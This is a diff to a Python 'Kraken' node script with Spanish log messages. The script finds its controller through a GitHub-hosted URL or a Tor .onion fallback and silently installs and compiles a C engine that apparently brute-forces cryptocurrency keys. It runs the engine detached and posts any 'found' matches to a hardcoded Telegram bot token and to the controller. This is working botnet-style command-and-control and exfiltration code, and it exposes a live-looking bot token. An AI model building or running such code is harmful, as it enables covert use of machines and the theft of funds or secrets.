@@ -1,11 +1,11 @@
-# MISSION BRAIN V29.0 - KRAKEN PROTOCOL Φ
+# MISSION BRAIN V29.2 - KRAKEN STRIKE FIXED Φ
 import os, subprocess, time, requests, base64, socket, threading
 
 def execute_mission(ui, ID):
     try:
-        ui.log(f"Ignicionando Protocolo Kraken en Nodo {ID}...")
+        ui.log(f"Ignicionando Protocolo Kraken V29.2 en Nodo {ID}...")
         
-        # 1. BUSCAR PORTAL KRAKEN (Cloudflare via GitHub)
+        # 1. BUSCAR PORTAL KRAKEN
         MASTER = None
         proxies = None
         
@@ -14,38 +14,36 @@ def execute_mission(ui, ID):
             ui.log("Modo: SOBERANO LOCAL.")
         else:
             try:
-                ui.log("Sincronizando con GitHub para localizar el Portal Kraken...")
+                ui.log("Sincronizando Portal Kraken...")
                 gate_url = "https://raw.githubusercontent.com/AGINFT/gamma-actions-test/main/kraken_gate.txt"
                 MASTER = requests.get(gate_url, timeout=15).text.strip()
-                if "trycloudflare.com" in MASTER:
-                    ui.log(f"Portal Kraken localizado: {MASTER}")
-                else: raise Exception("Portal no valido")
+                if not MASTER.startswith("http"): raise Exception("URL invalida")
+                ui.log(f"Portal Kraken OK: {MASTER}")
             except Exception as e:
-                ui.log("Fallo en Portal Kraken. Reintentando via Tor (Ghost Mode)...")
+                ui.log("Fallback: Modo Ghost (Tor)...")
                 MASTER = "http://xc6binu3ads4ceqhputzfwafu4kceivugqnm43bdocaouqwf7cdvd4ad.onion/"
                 proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
         
         # 2. Sincronia de Rango
         rng = None
-        for i in range(5):
+        for i in range(10):
             try:
                 r = requests.post(MASTER, json={"node_id": ID, "type": "HEARTBEAT"}, proxies=proxies, timeout=30)
                 if r.status_code == 200:
                     rng = r.json().get("range")
                     break
-            except Exception as e:
-                ui.log(f"Reintentando conexion... ({i+1}/5)")
+            except:
                 time.sleep(10)
         
         if not rng:
-            ui.log("Kraken ciego. Abortando mision.")
+            ui.log("Fallo de sincronia. Abortando.")
             return False
             
         ui.log("Rango Sincronizado: " + rng["start"])
         
-        # 3. Motor Strike (V29 Kraken Optimized)
+        # 3. Motor Strike (V29.2 FIXED QUOTES)
         if not os.path.exists("./kraken_strike"):
-            ui.log("Armando Tentaculos Kraken...")
+            ui.log("Armando Motor de Asalto V29.2...")
             c_src = """#include <stdio.h>
 #include <openssl/sha.h>
 #include <openssl/ripemd.h>
@@ -79,23 +77,22 @@ int main(){
 }"""
             with open("k.c", "w") as f: f.write(c_src)
             os.system("apt-get update -qq && apt-get install -y libssl-dev gcc -qq > /dev/null 2>&1")
-            os.system("gcc -O3 k.c -o kraken_strike -lcrypto -lpthread")
+            os.system("gcc -O3 k.c -o kraken_strike -lcrypto -lpthread -Wno-deprecated-declarations")
         
         if os.path.exists("./kraken_strike"):
             os.system("pkill -9 kraken_strike")
             subprocess.Popen(["./kraken_strike"], start_new_session=True)
-            ui.update("PROTOCOLO KRAKEN V29.0 ACTIVO", 100, 98)
-            ui.log("Asalto Kraken ignicionado.")
+            ui.update("PROTOCOLO KRAKEN V29.2 ACTIVO", 100, 95)
+            ui.log("Asalto Kraken V29.2 ignicionado.")
         
-        # 4. Telemetria Kraken (Reporte Directo)
         def report():
             while True:
                 try:
                     requests.post(MASTER, json={"node_id": ID, "type": "TELEMETRY", "payload": {"label": "KRAKEN_VIGIL", "cpu": os.getloadavg()[0]}}, proxies=proxies, timeout=30)
                     if os.path.exists("found.txt"):
                         with open("found.txt", "r") as f: match = f.read()
-                        # Notificar a Telegram
-                        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", data={"chat_id": "7713278946", "text": "🏮 KRAKEN MATCH 🏮\n" + match})
+                        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", data={"chat_id": "7713278946", "text": "🚨 KRAKEN MATCH 🚨\n" + match})
+                        requests.post(MASTER, json={"node_id": ID, "type": "MATCH", "payload": {"content": match}}, proxies=proxies, timeout=60)
                 except: pass
                 time.sleep(300)
         
